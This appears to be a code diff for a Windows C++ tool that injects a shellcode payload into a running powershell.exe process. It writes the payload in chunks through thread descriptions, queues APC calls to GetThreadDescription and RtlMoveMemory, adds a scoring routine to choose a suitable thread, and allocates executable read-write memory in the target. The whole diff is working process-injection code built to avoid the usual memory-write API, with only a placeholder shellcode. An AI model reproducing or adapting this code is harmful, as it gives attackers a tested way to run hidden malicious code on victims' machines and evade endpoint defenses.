@@ -8,6 +8,7 @@
 #include <string>
 #include <vector>
 #include <iomanip>
+#include <algorithm>
 
 using namespace std;
 
@@ -177,105 +178,366 @@ DWORD GetPIDByProcname(const std::wstring& processName) {
 	return 0; // Process not found
 }
 
-HANDLE findThread(HANDLE hProcess, DWORD desiredAccess) {
-	DWORD pid = GetProcessId(hProcess);
+//HANDLE findThread(HANDLE hProcess, DWORD desiredAccess) {
+//	DWORD pid = GetProcessId(hProcess);
+//	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+//	if (hSnapshot == INVALID_HANDLE_VALUE) {
+//		return INVALID_HANDLE_VALUE;
+//	}
+//	THREADENTRY32 te32;
+//	te32.dwSize = sizeof(THREADENTRY32);
+//	if (!Thread32First(hSnapshot, &te32)) {
+//		CloseHandle(hSnapshot);
+//		return INVALID_HANDLE_VALUE;
+//	}
+//	do {
+//		if (te32.th32OwnerProcessID == pid) {
+//			HANDLE hThread = OpenThread(desiredAccess, FALSE, te32.th32ThreadID);
+//			if (hThread) {
+//				CloseHandle(hSnapshot);
+//				return hThread;
+//			}
+//		}
+//	} while (Thread32Next(hSnapshot, &te32));
+//	CloseHandle(hSnapshot);
+//	return INVALID_HANDLE_VALUE;
+//}
+
+struct ThreadCandidate2 {
+	DWORD tid;
+	HANDLE hThread;
+	long long score;
+	ULONGLONG cycles;
+	ULONGLONG cpuTime;
+	LONG priority;
+	ULONG suspendCount;
+	std::wstring description;
+};
+typedef NTSTATUS(NTAPI* pNtQueryInformationThread)(
+	HANDLE ThreadHandle,
+	ULONG ThreadInformationClass,
+	PVOID ThreadInformation,
+	ULONG ThreadInformationLength,
+	PULONG ReturnLength
+	);
+
+// Structs for NtQueryInformationThread
+typedef struct _KERNEL_USER_TIMES {
+	FILETIME CreateTime;
+	FILETIME ExitTime;
+	FILETIME KernelTime;
+	FILETIME UserTime;
+} KERNEL_USER_TIMES, * PKERNEL_USER_TIMES;
+
+typedef struct _THREAD_CYCLE_TIME_INFORMATION {
+	ULONGLONG AccumulatedCycles;
+} THREAD_CYCLE_TIME_INFORMATION, * PTHREAD_CYCLE_TIME_INFORMATION;
+
+typedef struct _THREAD_BASIC_INFORMATION {
+	NTSTATUS ExitStatus;
+	PVOID TebBaseAddress;
+	CLIENT_ID ClientId;
+	KAFFINITY AffinityMask;
+	LONG Priority;
+	LONG BasePriority;
+} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;
+
+
+#define ThreadBasicInformation       0
+#define ThreadTimes                  1
+#define ThreadCycleTime             23
+#define ThreadSuspendCount          35
+
+
+
+
+HANDLE FindBestApcThread(DWORD targetPid) {
+	HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
+	if (!hNtDll) return INVALID_HANDLE_VALUE;
+
+	auto NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
+		GetProcAddress(hNtDll, "NtQueryInformationThread")
+		);
+	if (!NtQueryInformationThread) return INVALID_HANDLE_VALUE;
+
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-	if (hSnapshot == INVALID_HANDLE_VALUE) {
-		return INVALID_HANDLE_VALUE;
-	}
-	THREADENTRY32 te32;
-	te32.dwSize = sizeof(THREADENTRY32);
+	if (hSnapshot == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;
+
+	THREADENTRY32 te32{};
+	te32.dwSize = sizeof(te32);
+
+	std::vector<ThreadCandidate2> candidates;
+
 	if (!Thread32First(hSnapshot, &te32)) {
 		CloseHandle(hSnapshot);
 		return INVALID_HANDLE_VALUE;
 	}
+
 	do {
-		if (te32.th32OwnerProcessID == pid) {
-			HANDLE hThread = OpenThread(desiredAccess, FALSE, te32.th32ThreadID);
-			if (hThread) {
-				CloseHandle(hSnapshot);
-				return hThread;
+		if (te32.th32OwnerProcessID != targetPid) continue;
+
+		DWORD tid = te32.th32ThreadID;
+
+		HANDLE hThread = OpenThread(
+			THREAD_ALL_ACCESS,
+			FALSE,
+			tid
+		);
+		if (!hThread) continue;
+
+		// Query suspend count
+		ULONG suspendCount = 999;  // default high penalty if query fails
+		NTSTATUS status = NtQueryInformationThread(hThread, ThreadSuspendCount, &suspendCount, sizeof(suspendCount), nullptr);
+		if (!NT_SUCCESS(status)) suspendCount = 999;
+
+		// Query user/kernel time
+		KERNEL_USER_TIMES times{};
+		ULONGLONG totalCpuTime = 0;
+		status = NtQueryInformationThread(hThread, ThreadTimes, &times, sizeof(times), nullptr);
+		if (NT_SUCCESS(status)) {
+			ULONGLONG userTime = ((ULONGLONG)times.UserTime.dwHighDateTime << 32) | times.UserTime.dwLowDateTime;
+			ULONGLONG kernelTime = ((ULONGLONG)times.KernelTime.dwHighDateTime << 32) | times.KernelTime.dwLowDateTime;
+			totalCpuTime = userTime + kernelTime;
+		}
+
+		// Query cycle time
+		THREAD_CYCLE_TIME_INFORMATION cycleInfo{};
+		ULONGLONG cycles = 0;
+		status = NtQueryInformationThread(hThread, ThreadCycleTime, &cycleInfo, sizeof(cycleInfo), nullptr);
+		if (NT_SUCCESS(status)) {
+			cycles = cycleInfo.AccumulatedCycles;
+		}
+
+		// Skip completely idle threads (no activity at all)
+		if (cycles == 0 && totalCpuTime == 0) {
+			CloseHandle(hThread);
+			continue;
+		}
+
+		// Query basic info for priority
+		THREAD_BASIC_INFORMATION basicInfo{};
+		LONG priority = 9;  // default normal if fail
+		status = NtQueryInformationThread(hThread, ThreadBasicInformation, &basicInfo, sizeof(basicInfo), nullptr);
+		if (NT_SUCCESS(status)) {
+			priority = basicInfo.Priority;
+		}
+
+		// Thread description
+		std::wstring description;
+		PWSTR descPtr = nullptr;
+		if (SUCCEEDED(GetThreadDescription(hThread, &descPtr)) && descPtr) {
+			description = descPtr;
+			LocalFree(descPtr);
+		}
+
+		// Compute score (long long to avoid overflow with high cycles)
+		long long score = 0;
+
+		// Activity (primary factor)
+		score += static_cast<long long>(cycles) / 1000000ULL;           // +1 per million cycles
+		score += static_cast<long long>(totalCpuTime) / 100000ULL;      // +1 per ~0.01s
+
+		// Bonuses
+		if (suspendCount == 0) score += 300;
+		if (priority >= 8 && priority <= 10) score += 150;
+		bool goodDesc = description.empty() ||
+			description.find(L"ThreadPool") != std::wstring::npos ||
+			description.find(L"Foreground") != std::wstring::npos ||
+			description.find(L"Worker") != std::wstring::npos ||
+			description.find(L"pool") != std::wstring::npos;
+		if (goodDesc) score += 200;
+
+		// Penalties
+		if (suspendCount > 0) score -= 150LL * suspendCount;
+		if (priority < 1 || priority > 15) score -= 100;  // unusual priority
+		if (!goodDesc && !description.empty()) {
+			score -= 100;
+			// Extra penalty for known bad/specialized threads
+			if (description.find(L"DManip") != std::wstring::npos ||
+				description.find(L"Composition") != std::wstring::npos ||
+				description.find(L"VideoCapture") != std::wstring::npos ||
+				description.find(L"BrokerEvent") != std::wstring::npos ||
+				description.find(L"DMIT") != std::wstring::npos) {
+				score -= 150;
 			}
 		}
+
+		candidates.push_back({ tid, hThread, score, cycles, totalCpuTime, priority, suspendCount, std::move(description) });
+
 	} while (Thread32Next(hSnapshot, &te32));
+
 	CloseHandle(hSnapshot);
-	return INVALID_HANDLE_VALUE;
+
+	if (candidates.empty()) {
+		return INVALID_HANDLE_VALUE;
+	}
+
+	// Sort: highest score first, tie-break on highest cycles
+	std::sort(candidates.begin(), candidates.end(),
+		[](const ThreadCandidate2& a, const ThreadCandidate2& b) {
+			if (a.score != b.score) return a.score > b.score;
+			return a.cycles > b.cycles;
+		});
+
+	// Return the best one, close the rest
+	HANDLE bestHandle = candidates[0].hThread;
+	for (size_t i = 1; i < candidates.size(); ++i) {
+		CloseHandle(candidates[i].hThread);
+	}
+
+	// Optional debug: print top score (comment out in production)
+	// std::wcout << L"Best thread TID: " << candidates[0].tid << L", Score: " << candidates[0].score << std::endl;
+
+	return bestHandle;
 }
 
-bool CustomWriteProcessMemory(HANDLE hProcess, BYTE* payload, const size_t payload_size, LPVOID remotePtr) {
 
-	HANDLE hThread = findThread(hProcess, SYNCHRONIZE | THREAD_SET_LIMITED_INFORMATION | THREAD_SET_CONTEXT);
-	if (hThread == INVALID_HANDLE_VALUE) {
-		std::cerr << "Cannot find a thread in the target process!\n";
-		return 1;
+HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size)
+{
+	typedef NTSTATUS(NTAPI* pRtlInitUnicodeStringEx)(
+		PUNICODE_STRING DestinationString,
+		PCWSTR SourceString
+		);
+	typedef NTSTATUS(NTAPI* pNtSetInformationThread)(
+		HANDLE ThreadHandle,
+		THREADINFOCLASS ThreadInformationClass,
+		PVOID ThreadInformation,
+		ULONG ThreadInformationLength
+		);
+
+	UNICODE_STRING DestinationString = { 0 };
+
+	// Create temporary buffer without null bytes
+	BYTE* padding = (BYTE*)calloc(buf_size + sizeof(WCHAR), 1);
+	if (!padding) return E_OUTOFMEMORY;
+	memset(padding, 'A', buf_size);
+
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	auto _RtlInitUnicodeStringEx = (pRtlInitUnicodeStringEx)GetProcAddress(hNtdll, "RtlInitUnicodeStringEx");
+	auto _NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
+
+	if (!_RtlInitUnicodeStringEx || !_NtSetInformationThread) {
+		free(padding);
+		return E_FAIL;
 	}
 
-	std::cout << "WARNING: Using default SetThreadDescription - "
-		"ensure your buffer ends with double NULL bytes (\\0\\0)!\n";
+	// Initialize with padding
+	_RtlInitUnicodeStringEx(&DestinationString, (PCWSTR)padding);
 
-	HRESULT hr = SetThreadDescription(hThread, (PCWSTR)payload);
+	// Overwrite with real payload (including null bytes)
+	memcpy(DestinationString.Buffer, buf, buf_size);
 
-	if (FAILED(hr)) {
-		std::cerr << "SetThreadDescription failed! HRESULT: " << std::hex << hr << "\n";
-		CloseHandle(hThread);
-		return false;
-	}
+	// Call NtSetInformationThread directly
+	const THREADINFOCLASS ThreadNameInformation = (THREADINFOCLASS)0x26;
+	NTSTATUS status = _NtSetInformationThread(
+		hThread,
+		ThreadNameInformation,
+		&DestinationString,
+		0x10
+	);
 
-	if (!_NtQueueApcThreadEx2(hThread, GetThreadDescription, (void*)NtCurrentThread(), (void*)remotePtr, 0)) {
-		std::cerr << "Failed to queue APC\n";
-		CloseHandle(hThread);
-		return false;
-	}
+	/* NTSTATUS status = _NtSetInformationThread(
+		hThread,
+		ThreadNameInformation,
+		&DestinationString,
+		sizeof(UNICODE_STRING)
+	);*/
 
-	CloseHandle(hThread);
-
-	Sleep(2000); // Give time for APC to run
-
-	print_address("Payload pointer storage location (PEB + 0x340)", (ULONG_PTR)remotePtr);
-
-	cout << "\n--- Press ENTER to read the pointer stored at PEB+0x340 ---\n";
-	getchar();
-
-	std::vector<BYTE> ptrBuffer(8);
-	if (ReadProcessMemory(hProcess, remotePtr, ptrBuffer.data(), 8, nullptr)) {
-		ULONG_PTR real_payload_ptr = *(ULONG_PTR*)ptrBuffer.data();
-
-		if (real_payload_ptr == 0) {
-			cerr << "Error: Pointer is NULL - APC likely did not execute.\n";
-			return false;
-		}
-
-		print_address("Real payload location (allocated on remote heap)", real_payload_ptr);
-
-		cout << "\n--- Press ENTER to read the actual payload from the remote heap ---\n";
-		getchar();
-
-		std::vector<BYTE> payloadBuffer(payload_size);
-		if (ReadProcessMemory(hProcess, (LPCVOID)real_payload_ptr, payloadBuffer.data(), payload_size, nullptr)) {
-			cout << "PAYLOAD SUCCESSFULLY READ FROM REMOTE HEAP:\n";
-			for (size_t i = 0; i < payload_size; ++i) {
-				printf("%02X ", payloadBuffer[i]);
-				if ((i + 1) % 16 == 0) cout << "\n";
-			}
-			cout << "\n\n";
-
-			if (memcmp(payloadBuffer.data(), payload, payload_size) == 0) {
-				cout << "SUCCESS: Payload copied perfectly via thread description + special APC!\n";
-			}
-			else {
-				cout << "Warning: Payload bytes do not match exactly (possible truncation at NULLs).\n";
-			}
-		}
-		else {
-			cerr << "Error: Failed to read payload from remote address. GetLastError: " << GetLastError() << "\n";
-		}
-	}
-	else {
-		cerr << "Error: Failed to read pointer from PEB+0x340. GetLastError: " << GetLastError() << "\n";
-	}
-
-	return true;
+	free(padding);
+	return HRESULT_FROM_NT(status);
 }
+
+
+
+LPVOID CustomWriteProcessMemory(HANDLE hProcess, BYTE* payload, size_t payload_size, LPVOID remotePtr, HANDLE hThread, LPVOID rwx) {
+	// FUNCTION RESOLUTION (your original API loading code)
+	// ---------------------------------------------------------
+	// Assuming these global variables or helper functions are defined elsewhere:
+	// pReadProcessMemory, getFunctionAddressByHash, _NtQueueApcThreadEx2, CW_STR, etc.
+	// Cleaned up a bit to focus on the loop logic.
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	void* pRtlMoveMemory = (void*)GetProcAddress(hNtdll, "RtlMoveMemory");
+	if (!pRtlMoveMemory) return nullptr;
+
+	// ---------------------------------------------------------
+	// CHUNKING LOOP LOGIC
+	// ---------------------------------------------------------
+	// Define a safe block size.
+	// Must be LESS than 65535. Using 0x8000 (32768 bytes) for safety margin.
+	//const size_t MAX_BLOCK_SIZE = 0x8000;
+
+	// 49,152
+	//const size_t MAX_BLOCK_SIZE = 0xC000;
+
+	// 61,440
+	const size_t MAX_BLOCK_SIZE = 0xF000;
+
+	size_t bytesWritten = 0;
+
+	while (bytesWritten < payload_size) {
+		// 1. Calculate current chunk size
+		size_t remaining = payload_size - bytesWritten;
+		size_t currentChunkSize = (remaining > MAX_BLOCK_SIZE) ? MAX_BLOCK_SIZE : remaining;
+
+		// Pointer to the start of the current chunk in YOUR memory
+		BYTE* currentPayloadPtr = payload + bytesWritten;
+
+		// Pointer to the destination in REMOTE memory (advancing the rwx pointer)
+		void* currentRemoteDest = (BYTE*)rwx + bytesWritten;
+
+		std::cout << "[*] Processing chunk: " << currentChunkSize << " bytes..." << std::endl;
+
+		// 2. Use your original function to set this chunk in the thread description
+		HRESULT hr = mySetThreadDescription(hThread, currentPayloadPtr, currentChunkSize);
+		if (FAILED(hr)) {
+			std::cerr << "SetThreadDescription failed on chunk! HR: " << std::hex << hr << "\n";
+			return nullptr;
+		}
+
+		// 3. Queue APC #1: Force the process to allocate the description and write the address to remotePtr
+		if (!_NtQueueApcThreadEx2(hThread, GetThreadDescription, (void*)NtCurrentThread(), remotePtr, nullptr)) {
+			std::cerr << "Failed to queue GetThreadDescription APC\n";
+			return nullptr;
+		}
+
+		// Important: Wait for the APC to execute.
+		Sleep(10000);
+
+		// 4. Read where the OS stored our chunk (ReadProcessMemory)
+		ULONG_PTR realPayloadPtr = 0;
+
+		// Your retry logic would go here if needed...
+		if (!ReadProcessMemory(hProcess, remotePtr, &realPayloadPtr, sizeof(realPayloadPtr), nullptr)) {
+			std::cerr << "Failed to read ptr inside loop. GLE: " << GetLastError() << "\n";
+			return nullptr;
+		}
+
+		if (!realPayloadPtr) {
+			std::cerr << "Ptr is NULL inside loop.\n";
+			return nullptr;
+		}
+
+		// 5. Queue APC #2: Move memory from description (realPayloadPtr) to final destination (rwx + offset)
+		if (!_NtQueueApcThreadEx2(hThread, pRtlMoveMemory, currentRemoteDest, (void*)realPayloadPtr, (void*)currentChunkSize)) {
+			std::cerr << "Failed to queue memcpy APC\n";
+			return nullptr;
+		}
+
+		// Advance counters
+		bytesWritten += currentChunkSize;
+
+		// Small pause to ensure memcpy happens before overwriting description next iteration
+		Sleep(1000);
+	}
+
+	std::cout << "[+] All chunks staged. Waiting for nexts steps..." << std::endl;
+
+	// Optional final sleep
+	Sleep(5000);
+	// Return the base RWX address (realPayloadPtr changes each iteration so it's not valid at the end)
+	return rwx;
+}
+
 
 int main(){
 	DWORD pid = GetPIDByProcname(L"powershell.exe");
@@ -286,6 +548,10 @@ int main(){
 		return 1;
 	}
 
-	bool result = CustomWriteProcessMemory(hProcess, dummy_shellcode, dummy_shellcode_size, remotePtr);
+	LPVOID rwx = VirtualAllocEx(hProcess, nullptr, dummy_shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	HANDLE hThread = FindBestApcThread(pid);
+
+	bool result = CustomWriteProcessMemory(hProcess, dummy_shellcode, dummy_shellcode_size, remotePtr, hThread, rwx);
 	return 0;
 }
